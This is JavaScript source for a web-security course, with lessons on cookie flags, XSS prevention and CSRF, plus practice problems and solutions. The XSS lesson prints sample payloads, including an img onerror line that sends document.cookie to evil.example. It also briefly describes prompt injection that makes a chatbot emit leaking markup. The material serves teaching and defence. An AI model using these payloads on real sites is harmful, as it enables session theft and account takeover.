  <p><b>Where AI goes wrong:</b> it often generates <code>localStorage.setItem('token', ...)</code> tutorials by default, forgets <code>SameSite</code> or sets <code>SameSite=None</code> "to make it work", puts <code>Domain=.example.com</code> everywhere, and suggests removing <code>Secure</code> for local development instead of using <code>localhost</code> (which is already exempt).</p>
  <p><b>What you must still own:</b> mapping each cookie to the threat it handles, knowing the Lax/Strict/None behaviours by heart, and testing in real browsers because Chrome, Safari and Firefox differ on third-party cookies.</p>`,
  problems: [{
    title: 'Pick the Right Cookie Flags for a Session',
    level: 'Medium', tags: ['cookies', 'SameSite', 'HttpOnly', 'Secure'], companies: ['Okta', 'Shopify', 'Cloudflare'],
    statement: `<p>Write <code>sessionCookie(name, value, opts)</code> that returns a <code>Set-Cookie</code> header string following best practice. <code>opts</code> has <code>crossSite</code> (boolean: the cookie must be sent on cross-site requests, e.g. an embedded widget), <code>shareSubdomains</code> (boolean) with <code>domain</code> (string), and optional <code>maxAge</code> in seconds. Rules: always <code>Secure</code> and <code>HttpOnly</code>; <code>SameSite=None</code> if <code>crossSite</code> else <code>Lax</code>; if <code>shareSubdomains</code> use the <code>__Secure-</code> name prefix and add <code>Domain=...</code>, otherwise use the <code>__Host-</code> prefix with <code>Path=/</code> and no Domain; add <code>Max-Age</code> only when given. Throw if the value contains anything other than letters, digits and <code>._~-</code>.</p>`,
    constraints: `Output attribute order: <code>name=value; Path=/; [Domain=...; ]Secure; HttpOnly; SameSite=...[; Max-Age=...]</code>.`,
    example: `${H.table(['Input', 'Output'], [['("sid","abc", {})', '<code>__Host-sid=abc; Path=/; Secure; HttpOnly; SameSite=Lax</code>'], ['("sid","abc", {crossSite:true, maxAge:600})', '<code>__Host-sid=abc; Path=/; Secure; HttpOnly; SameSite=None; Max-Age=600</code>'], ['("sid","abc", {shareSubdomains:true, domain:"shop.com"})', '<code>__Secure-sid=abc; Path=/; Domain=shop.com; Secure; HttpOnly; SameSite=Lax</code>'], ['("sid","a;b", {})', H.c('r', 'throws: value contains ;')]])}`,
    brute: {
      why: `<p>The quick way is to paste every option into a string: <code>name + '=' + value + '; Domain=' + domain</code>. It forgets <code>HttpOnly</code> and <code>Secure</code>, never validates the value (a value of <code>x; Domain=evil.com</code> injects new attributes), and happily sets a wide <code>Domain</code>.</p>`,
      code: `function sessionCookieBrute(name, value, domain) {
  // No flags, no validation, wide Domain: do not ship this
  return name + '=' + value + '; Domain=' + domain;
}`
    },
    mcq: { q: 'Which cookie prefix guarantees the cookie was set by this exact host over HTTPS and cannot be overwritten by a sibling subdomain?', options: ['__Secure-', '__Host-', 'Domain=.example.com', 'SameSite=Strict'], answer: 1, explain: '__Host- forces Secure, Path=/ and no Domain attribute, so only the exact host that set it controls it. __Secure- only requires Secure.' },
    hints: [
      `<p>Hint 1: The safe settings are the default; only <code>SameSite</code>, the prefix and <code>Domain</code> depend on the options. Build the attribute list around that fact.</p>`,
      `<p>Hint 2: Validate the value first with a character allowlist (<code>/^[A-Za-z0-9._~-]*$/</code>), because the dangerous characters are exactly <code>; , space</code> and control characters.</p>`,
      `<p>Hint 3: Recipe: prefix = shareSubdomains ? '__Secure-' : '__Host-'; parts = [prefix+name+'='+value, 'Path=/']; if shareSubdomains push 'Domain='+domain; push 'Secure','HttpOnly','SameSite='+(crossSite?'None':'Lax'); if maxAge defined push 'Max-Age='+maxAge; join with '; '.</p>`
    ],
    solution: {
      approach: `<p>Default-secure: start from the strict flags and let the options only <em>relax</em> SameSite or add a Domain. The name prefix makes the browser enforce the rules for us, even if some other code later tries to overwrite the cookie.</p>`,
      code: {
        lang: 'js', run: true, code: `function sessionCookie(name, value, opts) {
  opts = opts || {};
  // Allowlist the value: ';' ',' whitespace could inject extra attributes.
  if (!/^[A-Za-z0-9._~-]*$/.test(value)) throw new Error('unsafe cookie value');
  if (opts.shareSubdomains && !opts.domain) throw new Error('domain required when sharing subdomains');

  var prefix = opts.shareSubdomains ? '__Secure-' : '__Host-';
  var parts = [prefix + name + '=' + value, 'Path=/'];
  if (opts.shareSubdomains) parts.push('Domain=' + opts.domain);   // __Host- forbids Domain
  parts.push('Secure', 'HttpOnly');
  parts.push('SameSite=' + (opts.crossSite ? 'None' : 'Lax'));
  if (typeof opts.maxAge === 'number') parts.push('Max-Age=' + Math.floor(opts.maxAge));
  return parts.join('; ');
}

console.log(sessionCookie('sid', 'abc', {}));
console.log(sessionCookie('sid', 'abc', { crossSite: true, maxAge: 600 }));
console.log(sessionCookie('sid', 'abc', { shareSubdomains: true, domain: 'shop.com' }));
try { sessionCookie('sid', 'a;b', {}); } catch (e) { console.log('throws: ' + e.message); }`
      },
      dry: {
        head: ['opts', 'prefix', 'Domain?', 'SameSite', 'header'],
        rows: [
          ['{}', '__Host-', 'no', 'Lax', '__Host-sid=abc; Path=/; Secure; HttpOnly; SameSite=Lax'],
          ['{crossSite:true, maxAge:600}', '__Host-', 'no', 'None', '... SameSite=None; Max-Age=600'],
          ['{shareSubdomains:true, domain:"shop.com"}', '__Secure-', 'shop.com', 'Lax', '__Secure-sid=abc; Path=/; Domain=shop.com; Secure; HttpOnly; SameSite=Lax']
        ]
      },
      complexity: `<p>O(L) in the length of the value (the regex test); everything else is constant work.</p>`,
      followUps: ['How would you add the Partitioned attribute for embeds?', 'How would you rotate the session id on privilege change?']
    }
  }]
});

/* ============================ TOPIC 4: XSS ============================ */
topics.push({
  title: 'XSS: Stored, Reflected, DOM-Based and How to Prevent It',
  analogy: `<p>Imagine a <b>notice board</b> in a school hallway where anyone can pin a note. A prankster pins a note that says "<i>Everyone who reads this must hand over their lunch money to me</i>" and the school has a robot that <em>obeys every note it reads out loud</em>. That robot is the browser, the note is user input, and the bug is that the page lets the note become an <b>instruction</b> instead of staying <b>text</b>. <b>XSS (Cross-Site Scripting)</b> means attacker-controlled data gets executed as code in <em>your</em> origin, with all the powers of your page.</p>`,
  explain: `<p>If an attacker can run JavaScript on <code>shop.com</code>, the Same-Origin Policy does not help you at all: the script <em>is</em> from shop.com. It can read the page, call your API as the logged-in user, change the form to steal passwords, read <code>localStorage</code>, and show fake login boxes. XSS is the one bug that turns every other defence off.</p>
  <h4>The three kinds</h4>
  ${H.table(['Kind', 'Where the evil text comes from', 'Who is hit', 'Example'], [
    ['<b>Stored</b> (persistent)', 'Saved in your database (comment, profile name, product review)', H.c('r', 'Everyone who views the page, no link needed'), 'Comment <code>&lt;img src=x onerror=...&gt;</code> is rendered for all readers'],
    ['<b>Reflected</b>', 'Comes from the current request (query string, form field) and is echoed straight back in the response', 'The victim who clicks a crafted link', '<code>/search?q=&lt;script&gt;...</code> and the page says "Results for ..."'],
    ['<b>DOM-based</b>', 'Client-side JavaScript reads a <i>source</i> (<code>location.hash</code>, <code>postMessage</code>) and writes it to a dangerous <i>sink</i> (<code>innerHTML</code>); the server never sees it', 'Victim opening a crafted link', '<code>el.innerHTML = location.hash.slice(1)</code>']
  ])}
  <h4>Prevention: defence in layers</h4>
  <ol>
    <li><b>Treat data as text, not HTML.</b> Use <code>textContent</code>, <code>createTextNode</code>, and framework bindings (<code>{value}</code> in React, <code>{{ value }}</code> in Vue/Angular) which escape automatically.</li>
    <li><b>Encode output for its context.</b> The same string needs different escaping inside HTML text, an HTML attribute, a JS string, a URL, or CSS. HTML-escaping alone does not make a JS string safe.</li>
    <li><b>Avoid dangerous sinks:</b> <code>innerHTML</code>, <code>outerHTML</code>, <code>insertAdjacentHTML</code>, <code>document.write</code>, <code>eval</code>, <code>new Function</code>, <code>setTimeout("string")</code>, React’s <code>dangerouslySetInnerHTML</code>, Vue’s <code>v-html</code>, jQuery <code>.html()</code>.</li>
    <li><b>If you must render user HTML</b> (rich text, markdown), run it through a maintained sanitizer such as <b>DOMPurify</b> (allowlist), never regex.</li>
    <li><b>Validate URLs:</b> only allow <code>http:</code>, <code>https:</code>, <code>mailto:</code>. A <code>javascript:alert(1)</code> in an <code>href</code> is code.</li>
    <li><b>Backstops:</b> a strict <b>CSP</b> (next topics), <b>Trusted Types</b> (the browser refuses plain strings at dangerous sinks), <b>HttpOnly cookies</b> (the cookie cannot be read, though the attacker can still act as the user).</li>
  </ol>
  <p><b>Escaping rule of thumb for HTML text and quoted attributes:</b> replace <code>&amp;</code> first, then <code>&lt;</code>, <code>&gt;</code>, <code>"</code> and <code>'</code> with their entities. Always quote attribute values.</p>
  ${H.table(['Character', 'Becomes', 'Why'], [['<code>&amp;</code>', '<code>&amp;amp;</code>', 'starts every entity; do this one first'], ['<code>&lt;</code>', '<code>&amp;lt;</code>', 'stops tags starting'], ['<code>&gt;</code>', '<code>&amp;gt;</code>', 'defence in depth'], ['<code>"</code>', '<code>&amp;quot;</code>', 'stops leaving a double-quoted attribute'], ['<code>\'</code>', '<code>&amp;#39;</code>', 'stops leaving a single-quoted attribute']])}`,
  clues: [
    '"User-generated content is displayed to other users" (comments, chat, profile) → stored XSS',
    '"Search term is shown on the results page" or "error message echoes the URL" → reflected XSS',
    '"Uses <code>innerHTML</code> / <code>document.write</code> / <code>location.hash</code>" → DOM XSS',
    '"Render markdown or a rich-text editor safely" → sanitize with DOMPurify / allowlist, plus CSP',
    '"HttpOnly cookie but account still taken over" → XSS can act as the user without reading the cookie',
    '"React is safe from XSS, right?" → only until <code>dangerouslySetInnerHTML</code>, <code>href=javascript:</code> or server-rendered HTML',
    '"Escape for what context?" → HTML text vs attribute vs JS vs URL vs CSS each differ'
  ],
  code: [
    {
      lang: 'js', run: true, title: 'HTML escaper with test inputs (runs in your browser)',
      code: `// Escape the 5 characters that can break out of HTML text or a quoted attribute.
// One pass with a lookup table avoids the classic "escape & last" double-escaping bug.
var ESC = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };

function escapeHtml(input) {
  return String(input == null ? '' : input).replace(/[&<>"']/g, function (ch) {
    return ESC[ch];
  });
}

var attacks = [
  'Hello <b>world</b>',
  '<img src=x onerror="stealCookie()">',
  '" onfocus="alert(1)" autofocus="',        // breaks out of value="..."
  "' onmouseover='alert(1)",                 // single-quoted attribute breakout
  'Tom & Jerry <3',
  '&lt;already escaped&gt;'                   // escaping twice is CORRECT: it is data, not markup
];
attacks.forEach(function (a) {
  console.log('IN : ' + a);
  console.log('OUT: ' + escapeHtml(a));
  console.log('');
});

// Where it goes: always inside QUOTED attributes or as text.
var user = '" onfocus="alert(1)" autofocus="';
console.log('<input value="' + escapeHtml(user) + '">');`
    },
    {
      lang: 'js', run: true, title: 'Allow only safe URL schemes (runs in your browser)',
      code: `// "javascript:alert(1)" in href or src is code. Allowlist the scheme.
function safeUrl(raw, base) {
  var allowed = ['http:', 'https:', 'mailto:'];
  try {
    // new URL() resolves relative links and strips tabs/newlines the way browsers do,
    // so "java\\tscript:" tricks are normalised BEFORE we check the scheme.
    var u = new URL(String(raw).trim(), base || 'https://app.example.com');
    return allowed.indexOf(u.protocol) !== -1 ? u.href : '#';
  } catch (e) {
    return '#';
  }
}

['/profile', 'https://example.com/a?b=1', 'mailto:hi@example.com', 'javascript:alert(1)', ' JaVaScRiPt:alert(1)', 'data:text/html,hi', '//evil.example/x']
  .forEach(function (u) { console.log(JSON.stringify(u) + ' -> ' + safeUrl(u)); });`
    },
    {
      lang: 'js', title: 'Dangerous sink vs safe sink (browser code)',
      code: `var out = document.getElementById('comments');
var userComment = new URLSearchParams(location.search).get('c') || '';

// BAD: the string is parsed as HTML. <img onerror=...> runs.
// out.innerHTML = '<p>' + userComment + '</p>';

// GOOD 1: text only. The browser never parses it as markup.
var p = document.createElement('p');
p.textContent = userComment;
out.appendChild(p);

// GOOD 2: you really need rich HTML -> sanitize with an allowlist library.
// import DOMPurify from 'dompurify';
// out.innerHTML = DOMPurify.sanitize(userHtml, { ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'], ALLOWED_ATTR: ['href'] });`
    },
    {
      lang: 'js', check: false, title: 'React: safe by default, unsafe on purpose',
      code: `import DOMPurify from 'dompurify';

function Comment({ text, html, website }) {
  return (
    <div>
      {/* SAFE: React escapes text children automatically */}
      <p>{text}</p>

      {/* DANGEROUS: you bypass the escaping. Sanitize first. */}
      <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />

      {/* DANGEROUS: href can be "javascript:...". Validate the scheme. */}
      <a href={/^https?:/i.test(website) ? website : '#'} rel="noopener noreferrer">site</a>
    </div>
  );
}`
    }
  ],
  codeTitle: ['escapeHtml with attacks', 'safeUrl scheme allowlist', 'innerHTML vs textContent', 'React and XSS'],
  viz: {
    title: 'An XSS payload through an unsafe render vs an escaped render',
    input: '<img src=x onerror="stealCookie()">',
    inputLabel: 'A comment someone posts (try plain text, too)',
    gen: function (input) {
      var s = String(input);
      if (!s.length) throw new Error('Type a comment, e.g. <img src=x onerror="stealCookie()">');
      if (s.length > 80) throw new Error('Use at most 80 characters');
      var MAP = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
      function esc(x) { return x.replace(/[&<>"']/g, function (c) { return MAP[c]; }); }
      function h(x) { return esc(x); }
      var danger = /<[a-zA-Z!\/]/.test(s) || /javascript:/i.test(s);
      var escd = esc(s);
      var frames = [];
      function qs(a, b, ha, hb) {
        return [{ type: 'queue', label: 'UNSAFE path (innerHTML = comment)', items: a, hl: ha || {}, frontLabel: 'start', backLabel: 'latest' },
                { type: 'queue', label: 'SAFE path (escape, then insert as text)', items: b, hl: hb || {}, frontLabel: 'start', backLabel: 'latest' }];
      }
      frames.push({
        narr: 'A visitor posts this comment: <code>' + h(s) + '</code>. ' + (danger ? 'It contains HTML syntax, which is what an attacker would send.' : 'It is plain text, nothing special.'),
        parts: qs(['comment typed'], ['comment typed']).concat([{ type: 'vars', label: 'Raw input', vals: { comment: s } }])
      });
      frames.push({
        narr: 'The server <b>stores</b> it exactly as typed (that is fine: storing is not the bug). Every later visitor will get this text from the database. Stored XSS needs no link-click.',
        parts: qs(['comment typed', 'saved in DB'], ['comment typed', 'saved in DB'], { 1: 'cur' }, { 1: 'cur' }).concat([{ type: 'vars', label: 'In the database', vals: { comment: s } }])
      });
      frames.push({
        narr: 'Page render, <b>unsafe</b> version: <code>el.innerHTML = comment</code>. The string goes into the <b>HTML parser</b>, so characters like &lt; and " keep their special meaning.',
        parts: qs(['comment typed', 'saved in DB', 'innerHTML parses it'], ['comment typed', 'saved in DB'], { 2: 'cur' }, {}).concat([{ type: 'vars', label: 'What the browser parses', vals: { 'HTML given to parser': s, 'becomes': danger ? 'a real HTML element with attributes' : 'plain text node' } }])
      });
      if (danger) {
        frames.push({
          narr: '<span class="c-r">Boom.</span> The parser created a real element. Its event handler (here <code>onerror</code>) runs attacker JavaScript <b>in your origin</b>: it can read non-HttpOnly cookies, call your API as the victim, or rewrite the page.',
          parts: qs(['comment typed', 'saved in DB', 'innerHTML parses it', 'attacker JS RUNS'], ['comment typed', 'saved in DB'], { 3: 'bad' }, {}).concat([{ type: 'vars', label: 'Result', vals: { 'script executed': 'YES', 'who can be hit': 'every visitor' }, hl: { 'script executed': 'bad' } }])
        });
      } else {
        frames.push({ narr: 'This particular comment has no markup, so the unsafe code happens to work. But the code is still <b>vulnerable</b>: it only takes one attacker to send a different string.', parts: qs(['comment typed', 'saved in DB', 'innerHTML parses it', 'looks fine (by luck)'], ['comment typed', 'saved in DB'], { 3: 'ok' }, {}) });
      }
      frames.push({
        narr: 'Page render, <b>safe</b> version: first <b>escape</b> the five special characters (<code>&amp; &lt; &gt; " \'</code>). The text is now made of harmless entities.',
        parts: qs(['comment typed', 'saved in DB', 'innerHTML parses it', danger ? 'attacker JS RUNS' : 'looks fine (by luck)'], ['comment typed', 'saved in DB', 'escapeHtml()'], { 3: danger ? 'bad' : 'ok' }, { 2: 'cur' }).concat([{ type: 'vars', label: 'After escaping', vals: { escaped: escd } }])
      });
      frames.push({
        narr: '<span class="c-g">Safe.</span> The browser receives <code>' + h(escd) + '</code>. It shows the original characters on screen as <b>text</b>, and nothing is executed. Even better: <code>textContent</code> or React’s <code>{value}</code> does this for you.',
        parts: qs(['comment typed', 'saved in DB', 'innerHTML parses it', danger ? 'attacker JS RUNS' : 'looks fine (by luck)'], ['comment typed', 'saved in DB', 'escapeHtml()', 'shown as TEXT'], { 3: danger ? 'bad' : 'ok' }, { 3: 'ok' }).concat([{ type: 'vars', label: 'Screen shows', vals: { visible_text: s, script_executed: 'no' }, hl: { script_executed: 'ok' } }])
      });
      return frames;
    }
  },
  examples: [
    {
      title: 'Stored XSS in a comment box',
      html: `<p>A blog saves comments and renders them with <code>comment.innerHTML = c.body</code>. An attacker posts <code>&lt;img src=x onerror="fetch('https://evil.example/log?c='+document.cookie)"&gt;</code>. The image fails to load, <code>onerror</code> runs, and every reader’s non-HttpOnly cookie goes to evil.example. In 2005 the "Samy" worm used the same idea on MySpace and added itself to a million profiles in 20 hours. <b>Fix:</b> <code>textContent</code> (or escape), plus <code>HttpOnly</code> on the session cookie, plus a CSP that blocks inline handlers.</p>`
    },
    {
      title: 'Reflected XSS in a search page',
      html: `<p>The server builds the page like this: <code>'&lt;h1&gt;Results for ' + req.query.q + '&lt;/h1&gt;'</code>. The attacker mails a link <code>/search?q=&lt;script&gt;...&lt;/script&gt;</code>. The victim clicks, the server <i>reflects</i> the payload into the HTML, and it runs with the victim’s session. <b>Fix:</b> use a template engine with auto-escaping (EJS <code>&lt;%= %&gt;</code>, Handlebars <code>{{ }}</code>, Jinja) and never concatenate HTML strings. Reflected XSS is also why error pages that print the URL are a classic finding.</p>`
    },
    {
      title: 'DOM XSS: the server never sees the payload',
      html: `<p><code>document.getElementById('welcome').innerHTML = 'Hi ' + location.hash.slice(1)</code>. The part after <code>#</code> is never sent to the server, so server logs and WAFs miss it entirely. Link: <code>https://app.example.com/#&lt;img src=x onerror=alert(1)&gt;</code>. <b>Fix:</b> <code>textContent</code>. Audit tip: grep your code base for <i>sources</i> (<code>location</code>, <code>document.referrer</code>, <code>postMessage</code> data, <code>window.name</code>) flowing into <i>sinks</i> (<code>innerHTML</code>, <code>eval</code>, <code>setAttribute('on...')</code>, <code>src</code>, <code>href</code>).</p>`
    },
    {
      title: 'Attribute context: why quotes matter',
      html: `<p>Template: <code>&lt;input value="USER"&gt;</code>. Attacker value: <code>" onfocus="alert(1)" autofocus="</code>. Result: <code>&lt;input value="" onfocus="alert(1)" autofocus=""&gt;</code>, which runs as soon as the page loads. No <code>&lt;</code> or <code>&gt;</code> was needed, only a double quote. That is why an escaper must handle quotes, and why attribute values must <b>always be quoted</b> (an unquoted attribute is broken by a plain space).</p>
      ${H.table(['Context', 'Dangerous characters', 'Correct defence'], [['HTML text', '<code>&lt; &amp;</code>', 'HTML-escape or <code>textContent</code>'], ['Quoted attribute', '<code>" \' &amp;</code>', 'HTML-escape + always quote'], ['URL attribute (href/src)', '<code>javascript:</code> scheme', 'Allowlist http/https/mailto'], ['Inside a JS string', '<code>\' " \\ &lt;/script</code>', 'Do not build JS from data; use <code>JSON.stringify</code> and data attributes'], ['CSS value', '<code>url( ) ; }</code>', 'Do not put user data in CSS; allowlist values']])}`
    }
  ],
  deepDive: `<p><b>Why "just strip the script tags" never works.</b> Filters get bypassed by <code>&lt;img onerror&gt;</code>, <code>&lt;svg onload&gt;</code>, <code>&lt;a href=javascript:&gt;</code>, upper/lower case, broken tags, encodings, and by <b>mutation XSS (mXSS)</b>: HTML that looks safe to your sanitizer but is <em>re-written by the browser’s parser</em> into something dangerous when it is serialised and parsed again (for example inside <code>&lt;noscript&gt;</code>, <code>&lt;svg&gt;</code>/<code>&lt;math&gt;</code> namespace switches). That is why you use a battle-tested library like DOMPurify that parses with the real browser parser and has a long history of fixes, and why you keep it updated like any other dependency.</p>
  <p><b>Modern native tools.</b> <b>Trusted Types</b> (<code>Content-Security-Policy: require-trusted-types-for 'script'</code>) makes the browser reject plain strings at injection sinks (<code>innerHTML</code>, <code>eval</code>, script <code>src</code>); only objects made by a named policy (for example one that calls DOMPurify) are accepted, shrinking the code you must audit to one place. The <b>Sanitizer API</b> (<code>element.setHTML(html)</code>) is a built-in allowlist sanitizer that is rolling out across browsers; feature-detect it and fall back to DOMPurify.</p>
  <p><b>Impact is bigger than cookie theft.</b> With HttpOnly the attacker cannot <i>read</i> the cookie, but injected JS still sends authenticated requests from the victim’s browser ("session riding"), reads CSRF tokens out of the DOM (so CSRF tokens do not help against XSS), installs a keylogger, or swaps your login form. Treat <b>any</b> XSS as full account takeover for that page.</p>
  <p><b>Edge places XSS hides.</b> JSON embedded in HTML (<code>&lt;script&gt;var data = {...}&lt;/script&gt;</code>): a string containing the closing script tag ends the block, so escape <code>&lt;</code> as <code>\\u003c</code> when serialising; SVG uploads (they can contain scripts, serve them as downloads or from a separate origin); Markdown renderers that allow raw HTML; PDF/email previews; <code>target="_blank"</code> without <code>rel="noopener"</code> (tab-nabbing; modern browsers default to noopener); and user-controlled <code>href</code> in a React app.</p>
  <p><b>Server-side rendering and escaping location.</b> Escape <i>at output</i>, in the context where the data is used, not at input. If you HTML-escape on save, you double-escape in JSON APIs, break search, and still miss the JS or URL context. Validate input for <i>shape</i> (length, type) and encode output for <i>context</i>.</p>
  <p><b>Detection.</b> CSP <code>report-to</code>, automated scanners, fuzzing every input with a polyglot payload list, code review rules banning <code>innerHTML</code>/<code>dangerouslySetInnerHTML</code> without a wrapper, and bug bounty programs.</p>`,
  aiEra: `<p><b>What AI changes:</b> AI code assistants generate UI code very fast, and they often take the shortest path: <code>innerHTML</code> for a template string, <code>dangerouslySetInnerHTML</code> for "render the markdown", <code>v-html</code> for CMS content. Studies of AI-written code regularly find injection flaws among the most common issues. Chat-based apps add a new twist: <b>LLM output is untrusted data too</b>. If your chatbot renders model replies as HTML or markdown, a prompt injection can make the model emit <code>&lt;img src=x onerror=...&gt;</code> or a markdown image whose URL leaks chat data. Render model output as text or sanitized markdown.</p>
  <p><b>Use AI as a partner:</b> ask <code>List every source and sink in this file that could cause DOM XSS, and show a payload for each</code>, or <code>Write 20 XSS test strings for HTML text, attribute, URL and JS-string contexts</code> and turn them into unit tests for your escaper. Use it to explain a scanner finding.</p>
  <p><b>Where AI goes wrong:</b> it recommends regex-based "sanitizers", escapes only <code>&lt;</code> and <code>&gt;</code> (forgetting quotes), HTML-escapes data placed in a JS or URL context, calls a function "safe" without testing the attribute context, and trusts that "React is safe" while generating <code>href={user.website}</code>.</p>
  <p><b>What you must still own:</b> knowing every sink in your app, choosing a sanitizer and CSP strategy, and reviewing AI diffs for new <code>innerHTML</code> uses. Add a lint rule (for example <code>react/no-danger</code>) so the review happens automatically.</p>`,
  problems: [{
    title: 'Write an HTML Escaper',
    level: 'Easy', tags: ['XSS', 'escaping', 'strings'], companies: ['Google', 'Meta', 'Yelp'],
    statement: `<p>Implement <code>escapeHtml(s)</code> that makes any string safe to place inside HTML text <em>or</em> inside a double- or single-quoted attribute value. Replace <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>"</code> and <code>'</code> with <code>&amp;amp;</code>, <code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;quot;</code> and <code>&amp;#39;</code>. <code>null</code> and <code>undefined</code> become the empty string; numbers are converted to strings. Existing entities must <b>also</b> be escaped (the input is data, not markup).</p>`,
    constraints: `Input length up to 10<sup>6</sup> characters; must run in O(n).`,
    example: `${H.table(['Input', 'Output'], [['<code>&lt;b&gt;Hi&lt;/b&gt;</code>', '<code>&amp;lt;b&amp;gt;Hi&amp;lt;/b&amp;gt;</code>'], ['<code>Tom &amp; Jerry</code>', '<code>Tom &amp;amp; Jerry</code>'], ['<code>" onfocus="x</code>', '<code>&amp;quot; onfocus=&amp;quot;x</code>'], ['<code>&amp;lt;</code>', '<code>&amp;amp;lt;</code> (escaped again: it is data)']])}<p>Why: after escaping, none of the five syntax characters survive, so the browser can only see text.</p>`,
    brute: {
      why: `<p>Chaining <code>replace</code> calls in the wrong order is the classic bug. If you replace <code>&lt;</code> first and <code>&amp;</code> last, the <code>&amp;</code> inside the freshly produced <code>&amp;lt;</code> is escaped again and the user sees <code>&amp;lt;</code> on screen. Forgetting quotes leaves every attribute context open. Several passes also cost O(5n).</p>`,
      code: `function escapeBrute(s) {
  // WRONG ORDER: & is escaped last, so the '&' we just created gets escaped again
  return String(s).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
}`
    },
    mcq: { q: 'Which input is still dangerous after replacing ONLY < and > (not quotes)?', options: ['&lt;script&gt;alert(1)&lt;/script&gt;', 'Hello world', 'x" onmouseover="alert(1)  inside value="..."', '5 &lt; 7'], answer: 2, explain: 'In an attribute context an attacker needs no angle brackets: a double quote ends the value and an event handler follows. Quotes must be escaped too.' },
    hints: [
      `<p>Hint 1: An attacker needs at most one of five characters to break out of text or a quoted attribute: <code>&amp; &lt; &gt; " '</code>.</p>`,
      `<p>Hint 2: Do the replacement in a <b>single pass</b> with a lookup table and a regex character class, so the output of one replacement is never re-scanned (that also fixes the <code>&amp;</code> ordering problem).</p>`,
      `<p>Hint 3: Recipe: <code>map = {'&amp;':'&amp;amp;', ...}</code>; return <code>String(s ?? '').replace(/[&amp;&lt;&gt;"']/g, ch =&gt; map[ch])</code>. Test with an already escaped string and quotes.</p>`
    ],
    solution: {
      approach: `<p>One regex pass with a character class and a lookup table. Single pass means we never re-escape our own output, so ordering bugs cannot happen, and the cost is linear.</p>`,
      code: {
        lang: 'js', run: true, code: `var MAP = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };

function escapeHtml(s) {
  if (s === null || s === undefined) return '';
  return String(s).replace(/[&<>"']/g, function (ch) { return MAP[ch]; });
}

var tests = ['<b>Hi</b>', 'Tom & Jerry', '" onfocus="x', '&lt;', null, 42, "it's"];
tests.forEach(function (t) { console.log(JSON.stringify(t) + ' -> ' + JSON.stringify(escapeHtml(t))); });`
      },
      dry: {
        head: ['Input char', 'In table?', 'Output'],
        rows: [
          ['&lt;', 'yes', '&amp;lt;'],
          ['b', 'no', 'b (copied)'],
          ['&amp;', 'yes', '&amp;amp; (never re-scanned)'],
          ['"', 'yes', '&amp;quot;']
        ]
      },
      complexity: `<p>Time O(n), space O(n) for the output string.</p>`,
      followUps: ['Why is escaping on output better than escaping on input?', 'What extra work is needed to put a value inside a JavaScript string literal safely?']
    }
  }]
});

/* ============================ TOPIC 5: CSRF ============================ */
topics.push({
  title: 'CSRF: Forged Requests and How to Stop Them',
  analogy: `<p>You give your bank a <b>signed blank cheque book</b> that automatically signs any cheque that arrives in your name (that is what a cookie does: it signs every request to the bank). A stranger cannot read your cheque book, but he can <b>post a cheque into your mail slot</b> ("pay 5000 to Mallory") and the machine signs it for you. <b>CSRF (Cross-Site Request Forgery)</b> tricks <em>your own browser</em> into sending a request you never meant to send, and the browser helpfully adds your login cookie. The cure: the bank also asks for something the stranger cannot know (a secret token) or refuses cheques that arrive from the wrong place (SameSite, Origin check).</p>`,
  explain: `<p>CSRF needs three ingredients:</p>
  <ol>
    <li>The site uses <b>cookies</b> (or other automatic credentials such as HTTP Basic auth) to know who you are.</li>
    <li>There is a <b>state-changing request</b> an attacker can predict: <code>POST /transfer?to=mallory&amp;amount=5000</code>.</li>
    <li>The attacker can make your browser <b>send</b> that request. A hidden auto-submitting form on <code>evil.com</code> is enough.</li>
  </ol>
  <p>The Same-Origin Policy does <em>not</em> stop this. evil.com cannot read the answer, but it does not care: the money already moved. This is the key difference between XSS (attacker code runs in <em>your</em> origin and can read everything) and CSRF (attacker code runs in <em>their</em> origin and can only cause blind writes).</p>
  <h4>Defences, from strongest to supporting</h4>
  ${H.table(['Defence', 'How it works', 'Notes'], [
    ['<b>SameSite cookies</b>', 'Browser does not attach the cookie to cross-site POSTs/fetches (<code>Lax</code>, <code>Strict</code>)', 'Default <code>Lax</code> in modern browsers; cheap and strong. Not a full replacement (same-site attackers, old browsers, Lax GET).'],
    ['<b>Anti-CSRF token</b> (synchronizer)', 'Server stores a random token in the session, puts it in a hidden form field / header, and checks it on every unsafe request', 'evil.com cannot read your page, so it cannot know the token. The classic, robust defence.'],
    ['<b>Double-submit cookie</b>', 'Token is sent both as a cookie and as a header/field; server checks they match', 'Stateless. Bind the token to the session with an HMAC, or an attacker who can set cookies wins.'],
    ['<b>Custom header + CORS</b>', 'Require e.g. <code>X-Requested-With</code> or <code>Content-Type: application/json</code>', 'Cross-site forms cannot add them; fetch can, but only after a preflight that evil.com fails. Fragile if the server accepts other content types.'],
    ['<b>Origin / Sec-Fetch-Site check</b>', 'Reject unsafe requests whose <code>Origin</code> is not yours or whose <code>Sec-Fetch-Site: cross-site</code>', 'Header values cannot be forged by page scripts. Great defence in depth.'],
    ['<b>Re-authentication</b>', 'Ask for password/2FA before sensitive actions', 'Stops damage even if everything else fails.']
  ])}
  <p><b>Never</b> change state with <code>GET</code>. Links, images and prefetchers all trigger GETs, and <code>SameSite=Lax</code> sends cookies on top-level GETs. <code>GET /delete?id=5</code> is a CSRF bug waiting to happen.</p>
  <p><b>Is my SPA safe?</b> If it sends <code>Authorization: Bearer ...</code> from JavaScript, there is no automatic credential, so classic CSRF does not apply (but now the token must live somewhere JS can read it: see the token storage topic). If it relies on a cookie, you need SameSite and/or a token.</p>
  <p><b>Login CSRF</b> is the sneaky cousin: the attacker logs <em>you</em> into <em>their</em> account, so what you type next (search history, a card number) lands in the attacker’s account. Protect the login form with a token as well.</p>`,
  clues: [
    '"Action happens when a logged-in user visits a malicious page" → CSRF',
    '"Cookie-based session auth" + "state-changing POST" → needs SameSite and/or token',
    '"Hidden token in the form that the attacker cannot guess" → synchronizer token',
    '"Stateless server, no session store" → double-submit cookie (signed / HMAC-bound)',
